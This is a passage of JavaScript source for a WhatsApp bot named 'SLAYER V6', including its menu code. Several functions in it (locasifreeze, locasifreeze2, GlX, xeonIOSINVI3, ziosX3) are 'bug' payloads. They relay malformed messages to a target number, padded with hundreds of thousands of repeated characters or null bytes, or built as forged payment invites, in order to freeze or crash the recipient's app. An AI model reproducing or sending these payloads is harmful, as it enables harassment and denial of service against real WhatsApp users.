											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: nomor
					}
				} : {}
			);
            console.log(chalk.red.bold('🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿'))
   	};
   	
   	async function ziosX3(target) {
    await cay.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: 'POLLING',
                expiryTimestamp: Date.now() + 86400000000, // 1000 days in milliseconds
            },
        },
        { participant: { jid: target } }
    );
}

async function ziosX4(target) {
    await cay.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: 'FBPAY',
                expiryTimestamp: Date.now() + 1814400000, // 21 days in milliseconds
            },
        },
        { participant: { jid: target } }
    );
}


   	async function xeonIOSINVI3(nomor){
cay.relayMessage(nomor, {
viewOnceMessage: {
message: {"extendedTextMessage":{"text":"🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿 \n|  Http://Wa.me//bugios/lucid&patones","matchedText":"Http://Wa.me//bugios/lucid&patones","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAQIDBQQGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzYMQ7CtTdVjIQgJPvk5DTp24bNGnTNjocHOoAnpZdsm3nQu6Si2C1ejL6eblUAMiyTiiZFDQCGCAAAACSAQB//8QAJhAAAgIBAgUEAwAAAAAAAAAAAREAAgMEECAhIjFBEhRRYRMwcf/aAAgBAQABPwBQB7KAcuIhGKXXSB4EKQU9LBMAnhcGIO9RLVRP9hHISwQX1wUDsBK46cgnKaWtMgsAxK6Y2uiEzBpMQJHqfKZMFaYiZiw0viNjCAztjKsDMZARhIOI1NkbS+PO+kkz8eo+4Md11OXVcIHzLBHYFCY7WYAMyam90D4mPVWaPxPdXCnury2c3qBLFnYjtKlFx9Ths7OHkZ4nmHgfM7EvYdv0GGDsdv/EAB4RAQACAQQDAAAAAAAAAAAAAAEAAhEDEDFBEiAw/9oACAECAQE/APVQlRtxHTcZzumZXxrXli1Tud/T/8QAGREBAQEAAwAAAAAAAAAAAAAAAREQACAw/9oACAEDAQE/AOqzLqXgT2//2Q==","canonicalUrl":"Http://Wa.me//bugios/lucid&patones","description":` ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ`,"title":`🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿`,"previewType":"quick_reply","inviteLinkGroupTypeV2":"Type2"}}
}}, {})
}
  async function locasifreeze(nomor, ptcp = false) {
   let mark = '0@s.whatsapp.net';
    await cay.relayMessage(nomor, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸"+"@0".repeat(109999)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: nomor } }, { messageId: null });
}
 async function locasifreeze2(nomor, ptcp = false) {
    await cay.relayMessage(nomor, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: nomor } }, { messageId: null });
}
async function GlX(nomor, Ptcp = true) {
      await cay.relayMessage(
        nomor,
        {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "Caywzz",
                  format: "EXTENSIONS_1",
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"Painzy 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"⿻ Staries Ni Boyy ⿻\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤▾ ⿻ StariesNiboss ⿻ ▾⭑̤${"\u0000".repeat(
                    1020000
                  )}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                  version: 3,
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: nomor,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ StariesPpk ⿻ ▾⭑"));
    }
// FUNCTION LOADING
async function loadingl () {
var arr = [
"🌑",
"🌘",
"🌗",
"🌖",
"🌕",
"🌖",
"🌗",
"🌘",
"🐣"
]
let load = await cay.sendMessage(from, {text: '🐣'},{quoted:m})
for (let i = 0; i < arr.length; i++) {
await sleep(100)
await cay.sendMessage(from, {text: arr[i], edit: load.key },{quoted:m});
}
}
async function loading () {
var arr = [
`${pushname}: *${command}*`,
"...",
"\`</>loading suksess✓</>\`"
]
let load = await cay.sendMessage(from, {text: 'loading..'},{quoted:fvn})
for (let i = 0; i < arr.length; i++) {
await sleep(100)
await cay.sendMessage(from, {text: arr[i], edit: load.key },{quoted:fvn});
}
}










// FUNCTION MESSAGE
    
    //batas
switch (command) {
case "menux":
case "e-menu":{
loading()
const mark = "120363190900094848@g.us"
const owned = "2347041620617@s.whatsapp.net"
let awal = `
Hay ${pushname}!👋 ${ucapan()}
*SLAYER V6* A Multi tasked bot with both bugs and normal multi devices feature. A quick model that takes WhatsApp task more easier.
♰ *U S E R I N F O* ♰
┏━━━━━━━━━━━━━━━━━━━━
│ _Name_ : *${pushname}*
│ Information : _*${isCreator ? 'OWNER' : isPremium ? 'PREMIUM' : 'NONE'}*_
┗━━━━━━━━━━━━━━━━━━━━
  ⧎ *S U B M E N U* ⧎ 
│ ∘  aimenu 
│ ∘  bugmenu
│ ∘  ownermenu 
│ ∘  groupmenu 
│ ∘  gamemenu
│ ∘  downloadmenu 
│ ∘  digitaloceanmenu
│ ∘  searchmenu 
│ ∘  quotesmenu
│ ∘  stikermenu
│ ∘  voicemenu
│ ∘  pushkontakmenu
│ ∘  toolsmenu 
│ ∘  funmenu
│ ∘  photooxymenu
│ ∘  topupmenu
│ ∘  panelmenu
│ ∘  storemenu
╰──────────────━
© made by emperor`
cay.sendMessage(m.chat, {
       image: { url: 'https://files.catbox.moe/0tzuv0.jpg'},
       caption: awal,
    contextInfo: {
      mentionedJid: [m.sender, owned,mark],
      forwardingScore: 999,
      isForwarded: true,
      externalAdReply: {
        showAdAttribution: true, 
        title: `👋🏻 Hai ${pushname}`,
        body: `powered by ${namaowner}`,
        thumbnailUrl: thumb,
        sourceUrl: "",
        mediaType: 1,
        renderLargerThumbnail: false
      }
    }
   })
await sleep(1500)
cay.sendMessage(m.chat, { audio: b, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: fkontak })
}
break
      case "menu": {
      const mark = "0@s.whatsapp.net"
const owned = "2347041620617@s.whatsapp.net"
        let audioFile = './image/music4.mp3'; // Ganti 
        await cay.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        const msgii = await generateWAMessageFromContent(m.chat, {
          viewOnceMessageV2Extension: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                  text: " SLAYER V6\n> © EMPEROR"
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: [{
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `
 ${pushname}!👋 ${ucapan()}
ʜᴇʟʟᴏ ɪ ᴀᴍ ʜᴇʀᴇ ᴛᴏ ʜᴇʟᴘ ʏᴏᴜ ᴡɪᴛʜ ᴀɴʏ ᴘʀᴏʙʟᴇᴍ! ᴄᴏɴᴛᴀᴄᴛ ᴍʏ ᴅᴇᴠᴇʟᴏᴘᴇʀ +2347041620617
╭────「 *sʟᴀʏᴇʀ ᴠ6* 」
├ ➵ *ᴠᴇʀꜱɪᴏɴ : ᴠ6*
├ ➵ *ʟɪʙʀᴀʀy :* ʙᴀɪʟᴇʏꜱ-ʙᴀsᴇᴅ
├ ➵ *ᴛʏᴘᴇ : ᴄᴀꜱᴇ ᴀɴᴅ ᴘʟᴜɢɪɴs*
├ ➵ *ʀᴜɴᴛɪᴍᴇ :* ${runtime(process.uptime())}
╰─────────────ヌ
> _*⻂COMMAND*_
┏─╌──╌──╌──╌⑇
╎♱ ᴇ-ᴍᴇɴᴜ
│♱ MenuAll
┖─╌─╌────╌〣
ᴍᴀᴅᴇ ʙʏ ᴇᴍᴘᴇʀᴏʀ x sʟᴀʏᴇʀ`,
                      hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/0tzuv0.jpg' }}, { upload: cay.waUploadToServer }))
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [
                        {
"name": "single_select",
